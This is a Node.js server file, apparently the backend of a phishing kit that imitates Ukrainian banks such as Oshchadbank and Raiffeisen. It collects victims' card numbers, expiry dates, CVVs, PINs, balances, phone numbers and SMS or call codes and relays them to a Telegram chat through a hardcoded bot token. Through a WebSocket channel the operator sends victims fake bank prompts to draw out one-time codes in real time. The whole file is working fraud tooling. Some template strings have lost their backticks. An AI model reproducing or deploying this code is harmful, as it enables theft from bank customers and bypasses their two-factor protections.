const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');

// =======================================================================
// --- НАСТРОЙКИ ---
// =======================================================================
const TELEGRAM_BOT_TOKEN = '7607171529:AAF4Tch8CyVujvaMhN33_tlasoGAHVmxv64';
const CHAT_ID = -4970332008; 
// !!! ВАЖЛИВО: Перевірте, що ця URL-адреса правильна і доступна з інтернету
const SERVER_URL = 'https://new-l8h6.onrender.com'; 
// =======================================================================

const app = express();
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN);

app.use(express.json());
app.use(cors());

// --- FIX 2: Явна маршрутизація для головної сторінки ---
// Це гарантує, що ваш index.html буде відданий, коли хтось заходить на сайт.
// Файл index.html має лежати в тій же папці, що й server.js
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Налаштування та запуск WebSocket сервера
const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

// --- FIX 1: Надійне встановлення вебхука з обробкою помилок ---
const webhookPath = /webhook/${TELEGRAM_BOT_TOKEN};
bot.setWebHook(${SERVER_URL}${webhookPath})
    .then(() => {
        console.log('Webhook successfully set on URL:', ${SERVER_URL}${webhookPath});
    })
    .catch((error) => {
        // Завдяки цьому сервер не "впаде", а покаже детальну помилку в логах
        console.error('!!! ERROR SETTING WEBHOOK !!!');
        console.error(error.message);
        console.error('Please check your TELEGRAM_BOT_TOKEN and SERVER_URL in server.js');
    });

// Endpoint для отримання оновлень від Telegram
app.post(webhookPath, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});


const clients = new Map(); 
const sessions = new Map(); 

wss.on('connection', (ws) => {
    console.log('Client connected via WebSocket');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(Client registered: ${data.sessionId});
            }
        } catch (e) { console.error('Error processing message:', e); }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(Client disconnected: ${sessionId});
            }
        });
    });
});

app.post('/api/submit', (req, res) => {
    const { sessionId, isFinalStep, ...stepData } = req.body;

    const existingData = sessions.get(sessionId) || { visitCount: 0 };
    const newData = { ...existingData, ...stepData };
    sessions.set(sessionId, newData);
    
    if (newData.call_code_input) {
        let message = <b>🔔 Отримано код із дзвінка (Ощадбанк)!</b>\n\n;
        message += <b>Код:</b> <code>${newData.call_code_input}</code>\n;
        message += <b>Сесія:</b> <code>${sessionId}</code>\n;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        return res.status(200).json({ message: 'Call code received' });
    }

    if (isFinalStep) {
        newData.visitCount += 1;
        sessions.set(sessionId, newData);

        console.log(Received FINAL data for session ${sessionId}, visit #${newData.visitCount});

        let message = '';
        let options;

        const visitText = newData.visitCount === 1 ? 'NEW' : ${newData.visitCount} раз;
        const singleStepBanks = ['Ощадбанк', 'Райффайзен'];

        if (!singleStepBanks.includes(newData.bankName) && !newData['card-cvv']) {

message = <b>[Крок 1] Новий запис! (${newData.bankName})</b>\n\n;
            message += <b>Назва банку:</b> ${newData.bankName}\n;
            message += <b>Номер телефону:</b> <code>${newData.phone || 'Не вказано'}</code>\n;
            message += <b>Номер карти:</b> <code>${newData.card || 'Не вказано'}</code>\n;
            message += <b>Кількість переходів:</b> ${visitText}\n;
            
            options = {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'ЗАПРОС', callback_data: zapit:${sessionId} }],
                        [{ text: 'Карта', callback_data: card_error:${sessionId} }, { text: 'Номер', callback_data: number_error:${sessionId} }]
                    ]
                }
            };
        } else {
            if (!singleStepBanks.includes(newData.bankName)) {
                message = <b>✅ [Крок 2] Повні дані! (${newData.bankName})</b>\n\n;
            } else {
                message = <b>✅ Новий запис! (${newData.bankName})</b>\n\n;
            }
            message += <b>Назва банку:</b> ${newData.bankName}\n;
            message += <b>Номер телефону:</b> <code>${newData.phone || 'Не вказано'}</code>\n;
            message += <b>Номер карти:</b> <code>${newData.card || 'Не вказано'}</code>\n;
            if(newData['card-expiry']) message += <b>Термін дії:</b> <code>${newData['card-expiry']}</code>\n;
            if(newData['card-cvv']) message += <b>CVV:</b> <code>${newData['card-cvv']}</code>\n;
            if(newData.pin) message += <b>Пін:</b> <code>${newData.pin}</code>\n;
            if (newData.balance) message += <b>Поточний баланс:</b> <code>${newData.balance}</code>\n;
            message += <b>Кількість переходів:</b> ${visitText}\n;
            
            options = {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'SMS', callback_data: sms:${sessionId} }, { text: 'ДОДАТОК', callback_data: app:${sessionId} }],
                        [{ text: 'ПІН', callback_data: pin_error:${sessionId} }, { text: 'КОД', callback_data: code_error:${sessionId} }, { text: 'КОД ✅', callback_data: timer:${sessionId} }],
                        [{ text: 'Карта', callback_data: card_error:${sessionId} }, { text: 'Номер', callback_data: number_error:${sessionId} }],
                        [{ text: 'OTHER', callback_data: other:${sessionId} }]
                    ]
                }
            };
        }
        
        bot.sendMessage(CHAT_ID, message, options).catch(err => console.error("Telegram send error:", err));
    }
    
    res.status(200).json({ message: 'OK' });
});

app.post('/api/sms', (req, res) => {
    const { sessionId, code } = req.body;
    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        let message = <b>💬 Отримано SMS!</b>\n\n;
        message += <b>Код:</b> <code>${code}</code>\n;
        message += <b>Номер телефону:</b> <code>${sessionData.phone}</code>\n;
        message += <b>Сесія:</b> <code>${sessionId}</code>\n;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        console.log(SMS code received for session ${sessionId});
        res.status(200).json({ message: 'OK' });
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});


bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const ws = clients.get(sessionId);
    if (ws && ws.readyState === WebSocket.OPEN) {
        let commandData = {};
        switch (type) {
            case 'sms': commandData = { text: "Вам відправлено SMS з кодом на мобільний пристрій , введіть його у форму вводу коду" }; break;

case 'app': commandData = { text: "Вам надіслано підтвердження у додаток мобільного банку. Відкрийте додаток банку та зробіть підтвердження для проходження автентифікації." }; break;
            case 'other': commandData = { text: "В нас не вийшло автентифікувати вашу картку. Для продвиження пропонуємо вказати картку іншого банку" }; break;
            case 'pin_error': commandData = { text: "Ви вказали невірний пінкод. Натисніть кнопку назад та вкажіть вірний пінкод" }; break;
            case 'card_error': commandData = { text: "Вказано невірний номер картки , натисніть назад та введіть номер картки вірно" }; break;
            case 'number_error': commandData = { text: "Вказано не фінансовий номер телефону . Натисніть кнопку назад та вкажіть номер який прив'язаний до вашої картки." }; break;
        }
        ws.send(JSON.stringify({ type: type, data: commandData }));
        bot.answerCallbackQuery(callbackQuery.id, { text: Команда "${type}" відправлена! });
    } else {
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Помилка: клієнт не в мережі!', show_alert: true });
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => { 
    console.log(Server is running on port ${PORT}); 
});
